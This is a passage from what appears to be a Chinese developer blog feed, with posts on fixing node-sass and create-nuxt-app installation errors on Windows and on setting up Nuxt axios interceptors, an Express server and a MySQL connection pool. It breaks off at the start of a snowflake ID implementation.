href="https://github.com/sass/node-sass/commit/b8050efbe0effb68b0617d28276c72eef1fb15ef" target="_blank" rel="noopener">这个好玩的 commit</a>）</p><ol><li>方法一：</li></ol><p> 直接翻墙安装；</p><ol start="2"><li>方法二：</li></ol><p>2.1 查看当前环境适用的binding.node</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -p &quot;[process.platform, process.arch, process.versions.modules].join(&#39;-&#39;)&quot;</span><br></pre></td></tr></table></figure><p>2.2  到<a href="https://github.com/sass/node-sass/releases" target="_blank" rel="noopener">这里</a>下载对应版本的文件。链接地址: <a href="https://github.com/sass/node-sass/releases" target="_blank" rel="noopener">https://github.com/sass/node-sass/releases</a><br>2.3 将下载好的文件放入缓存目录中,查看缓存目录命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; PS C:\Users\Administrator&gt; npm config get cache</span><br><span class="line">E:\nodejs\node_cache</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.3.1 通常yarn缓存目录：C:Users\你的用户名\AppData\Local\Yarn\Cache<br>2.3.2 通常npm缓存目录：C:Users\你的用户名\AppData\Roaming\npm-cache\node-sass<br>此处我的下载文件目录是：<code>&quot;E:\nodejs\node_cache\node-sass\4.13.1\win32-x64-72_binding.node&quot;</code></p><p>到这里去根据版本号、系统环境，选择下载 .node 文件，然后安装时，指定变量 sass_binary_path，如：<br><a href="https://github.com/sass/node-sass/releases/download/v4.13.0/win32-x64-72_binding.node" target="_blank" rel="noopener">https://github.com/sass/node-sass/releases/download/v4.13.0/win32-x64-72_binding.node</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i node-sass --sass_binary_path&#x3D;D:&#x2F;win32-x64-72_binding.node</span><br></pre></td></tr></table></figure><p>按上面这么做确实没错，而且也是必须，但是当你再次去创建ionic项目时还是会提示同样的错误(如果不报错说明你运气好，那下面就不用看了)，那么原因到底是为什么呢？那是因为你的确安装了sass而且也成功下载了相关文件了，只是你在执行时候可能是因为运气不好或者当前软件没设计好的原因没给你自动添加sass的环境变量，所以这是我们得自己手动添加一下系统的环境变量(怎么添加系统环境变量我这就不提了，因为我认为很多人应该都会的，这里我只提一下要加什么环境变量，大概路径)，例如我的环境变量如下：(这里提醒一下配置的路径最好是根据你的实际情况，因为每个人安装nodejs的方式都不一样)</p><p>解决方法设置环境变量：</p><ol><li>设置系统变量名称: <code>SASS_BINARY_PATH</code></li><li>系统变量值：<code>E:\nodejs\node_cache\node-sass\4.13.1\win32-x64-72_binding.node</code></li></ol><p><img src="https://img-blog.csdn.net/20180106162556616?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZGY5ODEwMTE1MTI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="图片"></p><h2 id="执行yarn-create-nuxt-app-jvfast-site报错文件名、目录名或卷标语法不正确"><a href="#执行yarn-create-nuxt-app-jvfast-site报错文件名、目录名或卷标语法不正确" class="headerlink" title="执行yarn create nuxt-app jvfast-site报错文件名、目录名或卷标语法不正确"></a>执行<code>yarn create nuxt-app jvfast-site</code>报错<code>文件名、目录名或卷标语法不正确</code></h2><p>报错信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yarn create v1.21.1</span><br><span class="line">[1&#x2F;4] Resolving packages...</span><br><span class="line">info There appears to be trouble with your network connection. Retrying...</span><br><span class="line">[2&#x2F;4] Fetching packages...</span><br><span class="line">[3&#x2F;4] Linking dependencies...</span><br><span class="line">[4&#x2F;4] Building fresh packages...</span><br><span class="line">success Installed &quot;create-nuxt-app@2.14.0&quot; with binaries:</span><br><span class="line">      - create-nuxt-app</span><br><span class="line">文件名、目录名或卷标语法不正确。</span><br><span class="line">error Command failed.</span><br><span class="line">Exit code: 1</span><br><span class="line">Command: E:\nodejs\node_global\bin\create-nuxt-app</span><br><span class="line">Arguments: jvfast-site</span><br><span class="line">Directory: D:\Workspace\jvfast\jvfast-site</span><br><span class="line">Output:</span><br></pre></td></tr></table></figure><p>可以根据提示找到对应的命令目录：<code>Command: E:\nodejs\node_global\bin\create-nuxt-app</code>,打开对应的目录文件：<code>&quot;E:\nodejs\node_global\bin\create-nuxt-app.cmd&quot;</code>。查看到源码是: <code>@&quot;%~dp0\C:\Users\Administrator\AppData\Local\Yarn\Data\global\node_modules\.bin\create-nuxt-app.cmd&quot;   %*</code>,所以看到实际调用的是： <code>C:\Users\Administrator\AppData\Local\Yarn\Data\global\node_modules\.bin\create-nuxt-app.cmd</code>. 继续找到该文件: <code>\C:\Users\Administrator\AppData\Local\Yarn\Data\global\node_modules\.bin\create-nuxt-app.cmd</code>,打开该文件查看源码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@IF EXIST &quot;%~dp0\node.exe&quot; (</span><br><span class="line">  &quot;%~dp0\node.exe&quot;  &quot;%~dp0\..\create-nuxt-app\cli.js&quot; %*</span><br><span class="line">) ELSE (</span><br><span class="line">  @SETLOCAL</span><br><span class="line">  @SET PATHEXT&#x3D;%PATHEXT:;.JS;&#x3D;;%</span><br><span class="line">  node  &quot;%~dp0\..\create-nuxt-app\cli.js&quot; %*</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>所以知道真正调用的命令是: <code>node  &quot;%~dp0\..\create-nuxt-app\cli.js&quot; %*</code>, 所以构造后的命令行是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node C:\Users\Administrator\AppData\Local\Yarn\Data\global\node_modules\create-nuxt-app\cli.js 你的nuxt项目名称</span><br></pre></td></tr></table></figure><p>执行以上的命令按照提示操作即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;nodejs环境配置&quot;&gt;&lt;a href=&quot;#nodejs环境配置&quot; class=&quot;headerlink&quot; title=&quot;nodejs环境配置&quot;&gt;&lt;/a&gt;nodejs环境配置&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;下载&lt;code&gt;node&lt;/code&gt;,并执行命令安装node配</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    <category term="Nuxtjs" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/Nuxtjs/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>Vue nuxtjs插件类库配置集成</title>
    <link href="https://seniortesting.club/posts/SxV1BqSN9r/"/>
    <id>https://seniortesting.club/posts/SxV1BqSN9r/</id>
    <published>2021-03-25T15:16:52.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="axios集成封装"><a href="#axios集成封装" class="headerlink" title="axios集成封装"></a>axios集成封装</h2><ol><li>在<code>nuxt.config.js</code>中配置<code>axios</code>:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">modules: [</span><br><span class="line">   [&#39;@nuxtjs&#x2F;axios&#39;, &#123;</span><br><span class="line">     progress: true,</span><br><span class="line">     retry: false,</span><br><span class="line">     credentials: true</span><br><span class="line">   &#125;],</span><br></pre></td></tr></table></figure><ol start="2"><li>二次封装的可在外部文件中使用<code>$axios</code>的方法,文件为: <code>@/api/index.js</code>:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 外部js文件访问$axios实例的方案</span><br><span class="line">let client</span><br><span class="line"></span><br><span class="line">export function setClient (newclient) &#123;</span><br><span class="line">  client &#x3D; newclient</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; Request helpers</span><br><span class="line">const request &#x3D; &#123;&#125;</span><br><span class="line">const reqMethods &#x3D; [&#39;request&#39;, &#39;delete&#39;, &#39;get&#39;, &#39;head&#39;, &#39;options&#39;, &#39;post&#39;, &#39;put&#39;, &#39;patch&#39;]</span><br><span class="line">reqMethods.forEach((method) &#x3D;&gt; &#123;</span><br><span class="line">  request[&#39;$&#39; + method] &#x3D; function () &#123;</span><br><span class="line">    if (!client) &#123; throw new Error(&#39;apiClient not installed&#39;) &#125;</span><br><span class="line">    return client[method].apply(null, arguments).then(res &#x3D;&gt; res &amp;&amp; res.data)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">export default request</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>对应的axios插件中注上上面封装的axios对象，文件名为：<code>@/plugins/axios.js</code> ：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; import &#123; MessageBox, Message &#125; from &#39;element-ui&#39;</span><br><span class="line">import cfg from &#39;@&#x2F;config&#39;</span><br><span class="line">import encrypt from &#39;@&#x2F;util&#x2F;EncryptUtil&#39;</span><br><span class="line">import &#123; setClient &#125; from &#39;@&#x2F;api&#39;</span><br><span class="line"></span><br><span class="line">const enableSecret &#x3D; cfg.secretEnabled</span><br><span class="line">const tokenHeader &#x3D; cfg.tokenHeader</span><br><span class="line">const tokenRefreshHeader &#x3D; cfg.tokenRefreshHeader</span><br><span class="line">const updateTokenAction &#x3D; &#39;sys&#x2F;user&#x2F;updateToken&#39;</span><br><span class="line">const logoutAction &#x3D; &#39;sys&#x2F;user&#x2F;logout&#39;</span><br><span class="line">export default (&#123; $axios, error, store, router &#125;) &#x3D;&gt; &#123;</span><br><span class="line">  $axios.defaults.timeout &#x3D; 30000</span><br><span class="line">  &#x2F;&#x2F; 拦截请求</span><br><span class="line">  $axios.onRequest((config) &#x3D;&gt; &#123;</span><br><span class="line">    &#x2F;&#x2F;  配置对应的请求token</span><br><span class="line">    const tokenInfo &#x3D; store.getters.token</span><br><span class="line">    if (tokenInfo) &#123;</span><br><span class="line">      config.headers[tokenHeader] &#x3D; tokenInfo</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 是否进行加密数据请求包,只针对json put&#x2F;post&#x2F;delete格式的body数据进行加密,其他格式不进行加密</span><br><span class="line">    const data &#x3D; config.data</span><br><span class="line">    if (enableSecret &amp;&amp; data &amp;&amp; data instanceof Object &amp; config.headers.common.Accept.startsWith(&#39;application&#x2F;json&#39;)) &#123;</span><br><span class="line">      &#x2F;&#x2F; 如果对应的有data数据并且需要加解密</span><br><span class="line">      config.headers[&#39;Content-Type&#39;] &#x3D; &#39;application&#x2F;json;charset&#x3D;UTF-8&#39;</span><br><span class="line">      const jsonStr &#x3D; JSON.stringify(data)</span><br><span class="line">      const encryptJsonData &#x3D; encrypt.encode(jsonStr)</span><br><span class="line">      config.data &#x3D; encryptJsonData</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  $axios.onResponse((response) &#x3D;&gt; &#123;</span><br><span class="line">    const refreshToken &#x3D; response.headers[tokenRefreshHeader]</span><br><span class="line">    const data &#x3D; response.data</span><br><span class="line">    &#x2F;&#x2F; 更新token</span><br><span class="line">    if (refreshToken) &#123;</span><br><span class="line">      store.dispatch(updateTokenAction, refreshToken)</span><br><span class="line">    &#125;</span><br><span class="line">    if (data) &#123;</span><br><span class="line">      const code &#x3D; data.code</span><br><span class="line">      &#x2F;&#x2F; 进行json数据的解密</span><br><span class="line">      if (enableSecret &amp;&amp; (typeof data &#x3D;&#x3D;&#x3D; &#39;string&#39;)) &#123;</span><br><span class="line">        const decodeJsonStr &#x3D; encrypt.decode(data)</span><br><span class="line">        response.data &#x3D; JSON.parse(decodeJsonStr)</span><br><span class="line">      &#125;</span><br><span class="line">      &#x2F;&#x2F; 跳转页面</span><br><span class="line">      if (code &#x3D;&#x3D;&#x3D; 401) &#123;</span><br><span class="line">        store.dispatch(logoutAction).then(() &#x3D;&gt; router.push(&#123; name: cfg.page.loginComponentName &#125;))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  $axios.onError((error) &#x3D;&gt; &#123;</span><br><span class="line">    console.log(&#39;err&#39; + error)</span><br><span class="line">  &#125;)</span><br><span class="line">  &#x2F;&#x2F; 暴露$axios对象,方便在外部文件访问对应的$axios实例</span><br><span class="line">  setClient($axios)</span><br><span class="line">  window.axios &#x3D; $axios</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="express环境搭建"><a href="#express环境搭建" class="headerlink" title="express环境搭建"></a>express环境搭建</h2><p>express与nuxt集成，添加如下类库：</p><ol><li><code>consola</code>， 控制台颜色显示</li><li><code>morgan</code>，日志记录，日志格式，配置输出到文件日志</li><li><code>cors</code>， 跨域访问设置</li><li><code>body-parser</code>， 直接解析返回的数据结果通过<code>res.body</code></li></ol><h3 id="index-js入口express总配置代码如下"><a href="#index-js入口express总配置代码如下" class="headerlink" title="index.js入口express总配置代码如下"></a><code>index.js</code>入口express总配置代码如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">const path &#x3D; require(&#39;path&#39;)</span><br><span class="line">const fs &#x3D; require(&#39;fs&#39;)</span><br><span class="line">const express &#x3D; require(&#39;express&#39;)</span><br><span class="line">const consola &#x3D; require(&#39;consola&#39;)</span><br><span class="line">const &#123; Nuxt, Builder &#125; &#x3D; require(&#39;nuxt&#39;)</span><br><span class="line">&#x2F;&#x2F; start express app</span><br><span class="line">const isDev &#x3D; process.env.NODE_ENV !&#x3D;&#x3D; &#39;production&#39;</span><br><span class="line">const rootPwd &#x3D; process.cwd()</span><br><span class="line">const app &#x3D; express()</span><br><span class="line">&#x2F;&#x2F; ------cors: registering cors</span><br><span class="line">const cors &#x3D; require(&#39;cors&#39;)</span><br><span class="line">app.use(cors())</span><br><span class="line">&#x2F;&#x2F; ------body-parser: configure body parser,grabbing the HTTP body, decoding the information, and appending it to the req.body</span><br><span class="line">const bodyParser &#x3D; require(&#39;body-parser&#39;)</span><br><span class="line">app.use(bodyParser.urlencoded(&#123; extended: false &#125;))</span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line">&#x2F;&#x2F; ------morgan: configure morgan</span><br><span class="line">const FileStreamRotator &#x3D; require(&#39;file-stream-rotator&#39;)</span><br><span class="line">const morgan &#x3D; require(&#39;morgan&#39;)</span><br><span class="line">const devModify &#x3D; &#39;[:date[clf]] &quot;:method :url HTTP&#x2F;:http-version&quot; :status - :res[content-length] - :response-time ms &quot;:referrer&quot; &quot;:user-agent&quot;&#39;</span><br><span class="line">const combinedModify &#x3D; &#39;:remote-addr - :remote-user [:date[clf]] &quot;:method :url HTTP&#x2F;:http-version&quot; :status :response-time ms &quot;:referrer&quot; &quot;:user-agent&quot;&#39;</span><br><span class="line">const morganFormat &#x3D; isDev ? devModify : combinedModify</span><br><span class="line">&#x2F;&#x2F; ensure log directory exists</span><br><span class="line">const logDirectory &#x3D; path.join(rootPwd, &#39;logs&#39;)</span><br><span class="line">fs.existsSync(logDirectory) || fs.mkdirSync(logDirectory)</span><br><span class="line">&#x2F;&#x2F; 1. create stream</span><br><span class="line">&#x2F;&#x2F; const accessLogStream &#x3D; fs.createWriteStream(logPath, &#123; flags: &#39;a&#39; &#125;)</span><br><span class="line">&#x2F;&#x2F; 2. create a rotating write stream</span><br><span class="line">const accessLogStream &#x3D; FileStreamRotator.getStream(&#123;</span><br><span class="line">  date_format: &#39;YYYYMMDD&#39;,</span><br><span class="line">  filename: path.join(logDirectory, &#39;access-%DATE%.log&#39;),</span><br><span class="line">  frequency: &#39;daily&#39;,</span><br><span class="line">  verbose: false</span><br><span class="line">&#125;)</span><br><span class="line">app.use(morgan(morganFormat, &#123; stream: accessLogStream &#125;)) &#x2F;&#x2F; configire morgan</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Router: Import API Routes</span><br><span class="line">const config &#x3D; require(&#39;.&#x2F;api&#x2F;config&#39;)</span><br><span class="line">const api &#x3D; require(&#39;.&#x2F;api&#x2F;controller&#39;)</span><br><span class="line">app.use(config.prefix, api)</span><br><span class="line">async function start () &#123;</span><br><span class="line">  &#x2F;&#x2F; Init Nuxt.js</span><br><span class="line">  const nuxtConfig &#x3D; require(&#39;..&#x2F;..&#x2F;nuxt.config.js&#39;)</span><br><span class="line">  &#x2F;&#x2F; Import and Set Nuxt.js options</span><br><span class="line">  nuxtConfig.dev &#x3D; isDev</span><br><span class="line">  const nuxt &#x3D; new Nuxt(nuxtConfig)</span><br><span class="line">  const &#123; host, port &#125; &#x3D; nuxt.options.server</span><br><span class="line"></span><br><span class="line">  await nuxt.ready()</span><br><span class="line">  &#x2F;&#x2F; Build only in dev mode</span><br><span class="line">  if (nuxtConfig.dev) &#123;</span><br><span class="line">    const builder &#x3D; new Builder(nuxt)</span><br><span class="line">    await builder.build()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Give nuxt middleware to express</span><br><span class="line">  app.use(nuxt.render)</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Listen the server</span><br><span class="line">  app.listen(port, host)</span><br><span class="line">  consola.ready(&#123;</span><br><span class="line">    message: &#96;Server listening on http:&#x2F;&#x2F;$&#123;host&#125;:$&#123;port&#125;&#96;,</span><br><span class="line">    badge: true</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="node-mysql库配置"><a href="#node-mysql库配置" class="headerlink" title="node-mysql库配置"></a>node-mysql库配置</h2><p>推荐类库: <a href="https://github.com/mysqljs/mysql#install" target="_blank" rel="noopener">https://github.com/mysqljs/mysql#install</a></p><p>类库代码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">&#x27;../config&#x27;</span>)</span><br><span class="line"><span class="comment">// 雪花算法计算id</span></span><br><span class="line"><span class="keyword">const</span> Snowflake = <span class="built_in">require</span>(<span class="string">&#x27;./snowflake&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> idWorker = <span class="keyword">new</span> Snowflake(config.snowflake.worker_id, config.snowflake.datacenter_id)</span><br><span class="line"><span class="comment">// 建立连接池，并设置连接池</span></span><br><span class="line"><span class="keyword">const</span> pool = mysql.createPool(config.db)</span><br><span class="line">pool.on(<span class="string">&#x27;acquire&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">connection</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Connection %d acquired&#x27;</span>, connection.threadId)</span><br><span class="line">&#125;)</span><br><span class="line">pool.on(<span class="string">&#x27;enqueue&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Waiting for available connection slot&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">pool.on(<span class="string">&#x27;release&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">connection</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Connection %d released&#x27;</span>, connection.threadId)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * select,update,delete,insert操作</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="variable">query</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="variable">bindParameters</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return </span>返回结果</span></span><br><span class="line"><span class="comment"> *     得到返回id: results.insertId</span></span><br><span class="line"><span class="comment"> *     得到insert, update or delete的数据条数: results.affectedRows</span></span><br><span class="line"><span class="comment"> *     得到update更改的条数，如果数据没有更改则不会计数： results.changedRows</span></span><br><span class="line"><span class="comment"> *     得到count(1)对应的数据条数: results[0].count</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> exec = <span class="function"><span class="keyword">function</span> (<span class="params">query, ...bindParameters</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    pool.getConnection(<span class="function">(<span class="params">err, connection</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;CONNECT Thread &#x27;</span>, connection.threadId, <span class="string">&#x27;, ERROR:&#x27;</span>, err.message)</span><br><span class="line">        resolve(err)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        connection.query(query, bindParameters, <span class="function">(<span class="params">error, results, fields</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="comment">// When done with the connection, release it.</span></span><br><span class="line">          <span class="comment">// if (error) &#123; throw error &#125;</span></span><br><span class="line">          <span class="comment">// Handle error after the release.</span></span><br><span class="line">          connection.release()</span><br><span class="line">          resolve(error, results, fields)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> nextId = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> idWorker.nextId()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123; exec, nextId &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="snowflake雪花算法nodejs实现"><a href="#snowflake雪花算法nodejs实现" class="headerlink" title="snowflake雪花算法nodejs实现"></a>snowflake雪花算法nodejs实现</h2><p>代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 